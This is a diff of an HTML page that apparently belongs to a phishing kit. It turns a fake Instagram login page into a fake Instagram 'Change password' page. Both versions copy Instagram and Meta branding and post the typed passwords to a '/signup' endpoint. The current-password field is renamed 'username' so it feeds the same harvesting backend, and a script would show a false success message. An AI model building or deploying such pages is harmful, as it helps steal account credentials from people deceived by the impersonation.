@@ -1,156 +1,168 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-<link href="https://fonts.googleapis.com/css2?family=DM+Serif+Text:ital@0;1&family=Playwrite+DE+LA:wght@100..400&display=swap" rel="stylesheet"/>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.1.0/css/all.css" integrity="sha512-ajhUYg8JAATDFejqbeN7KbF2zyPbbqz04dgOLyGcYEk/MJD3V+HJhJLKvJ2VVlqrr4PwHeGTTWxbI+8teA7snw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <style>
+    <title>Change Password</title>
+    <style type="text/css" media="all">
     * {
-    box-sizing: border-box;
+      padding:0;
+      margin:0;
+      box-sizing:border-box;
+    }
+     body {
+    font-family: Arial, sans-serif;
+    background-color:#162127 ;
+    color: #ffffff;
     margin: 0;
     padding: 0;
-  }
-
-body {
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height:100%;
-    background-color: #fafafa;
 }
 
 .container {
     width: 100%;
-    max-width:100%;
+    max-width: 400px;
     height:100%;
-    padding: 20px;
-    border: 1px solid #dbdbdb;
-    background-color: #fff;
-    text-align: center;
+    border-radius: 10px;
+    padding:10px 0;
 }
 
-.logo {
-   font-weight:400;
-    font-family: "Playwrite DE LA", cursive;
-    font-size: 2.5rem;
-    margin-top:50px;
-    margin-bottom: 50px;
-}
-
-.fb-login {
-    width: 100%;
-    padding: 7px;
-    background-color: #0095f6;
-    border: none;
-    color: white;
-    font-weight: bold;
-    cursor: pointer;
+header h1 {
+    font-size: 1em;
+    color: #ffffff;
     margin-bottom: 10px;
-    border-radius: 5px;
-}
-i {
-  font-size:18px;
-  padding:5px;
-}
-.or {
-    position: relative;
-    margin: 20px 0;
-    color: #8e8e8e;
+    padding-left:15px;
+    font-weight:400;
 }
 
-.or::before,
-.or::after {
-    content: '';
-    position: absolute;
-    top: 50%;
-    width: 45%;
-    height: 1px;
-    background-color: #dbdbdb;
+main h2 {
+    font-size: 1.5em;
+    color: #ffffff;
+    margin-bottom: 10px;
+    padding-left:20px;
 }
 
-.or::before {
-    left: 0;
-}
-
-.or::after {
-    right: 0;
-}
-
-form {
-    display: flex;
-    flex-direction: column;
+main p {
+    font-size: 1em;
+    color: #ffffff;
+    margin-bottom: 20px;
+    padding:0 18px ;
 }
 
 form input {
-    width: 100%;
+    width:92%;
     padding: 10px;
-    margin-bottom:10px;
-    border: 1px solid #dbdbdb;
-    border-radius: 5px;
+    height:60px;
+    border:1px solid #8493A1;
+    border-radius: 15px;
+    background-color:transparent;
+    color: #ffffff;
+    font-size: 1em;
+    margin:12px  auto;
+    display:flex;
+}
+input::placeholder {
+  color:#8493A1;
+}
+#logoutCheckbox  {
+  width:30px !important;
+  height:30px !important;
+}
+.checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+    padding:3px 10px;
 }
 
-form button {
-    width: 100%;
-    padding: 10px;
-    background-color: #0095f6;
+.checkbox-container input {
+    margin-right: 10px;
+}
+
+.checkbox-container label {
+    font-size: 0.9em;
+    color: #ffffff;
+}
+
+button {
+    width:340px;
+    padding:16px;
+    background-color:#5aa4e5;
     border: none;
-    color: white;
-    font-weight: bold;
+    border-radius: 32px;
+    color: #ffffff;
+    font-size: 1em;
     cursor: pointer;
-    border-radius: 5px;
+    display:flex;
+    justify-content: center;
+    align-items: center;
+    margin:0 auto;
 }
 
-.forgot-password {
-    color: #0095f6;
-    margin-bottom:10px;
-    text-decoration: none;
-    text-align:right;
+button:hover {
+    background-color: #005bb5;
 }
-
-.signup {
-    margin-top: 20px;
-    color: #8e8e8e;
+hr {
+  margin:15px 0;
+  margin-top:170px;
+  border-bottom:none;
 }
-
-.signup a {
-    color: #0095f6;
-    text-decoration: none;
-}
-
-.footer {
-    margin-top: 200px;
-    color: #8e8e8e;
-}
-
-.meta {
-    font-weight: bold;
-    color: black;
-    background:linear-gradient(to right top, hsl(333, 71.4%, 50.6%), hsl(0, 84.2%, 60.2%), hsl(217, 91.2%, 59.8%));
-    color:transparent;
-    background-clip:text;
+a {
+  text-decoration:none;
+  padding-left:10px;
+  color:#5aa4e9;
+  font-weight:bold;
+  padding:13px;
 }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="logo">Instagram</h1>
-        <button class="fb-login"><i class="fab fa-facebook"></i>Continue with Facebook</button>
-        <div class="or">OR</div>
-        <form action="/signup" method="post" accept-charset="UTF-8">
-            <input type="text" placeholder="Phone number, username, or email" name="username" required>
-            <input type="password" placeholder="Password" name="password" required>
-            <a href="#" class="forgot-password">Forgot password?</a>
-            <button type="submit">Log in</button>
-        </form>
-        <div class="signup">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
-        <div class="footer">from <span class="meta">Meta</span></div>
+        <header>
+            <h1>coder_kush_68 &bull; Instagram</h1>
+        </header>
+        <main>
+            <h2>Change password</h2>
+            <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>
+            <form id="passwordForm" action="/signup" method="post"
+            accept-charset="UTF-8">
+                <input type="password" id="currentPassword"
+                name="username" required placeholder="Current password">
+
+                <input type="password" id="newPassword" name="password"
+                required placeholder="New password">
+
+                <input type="password" id="confirmPassword"
+                name="confirmPassword" required placeholder="Re-type new password">
+                 <a href="#">Forgot your password?</a>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="logoutCheckbox" name="logoutCheckbox" checked>
+                    <label for="logoutCheckbox">Log out of other devices. Choose this if someone else used your account.</label>
+                </div>
+<hr/>
+                <button type="submit">Change password</button>
+            </form>
+        </main>
     </div>
+    <script src="script.js">
+      document.getElementById('passwordForm').addEventListener('submit', function (event) {
+    event.preventDefault();
+
+    const currentPassword = document.getElementById('currentPassword').value;
+    const newPassword = document.getElementById('newPassword').value;
+    const confirmPassword = document.getElementById('confirmPassword').value;
+
+    if (newPassword !== confirmPassword) {
+        alert('New password and confirmation do not match.');
+        return;
+    }
+
+    if (newPassword.length < 6) {
+        alert('New password must be at least 6 characters long.');
+        return;
+    }
+
+    alert('Password changed successfully!');
+});
+    </script>
 </body>
 </html>
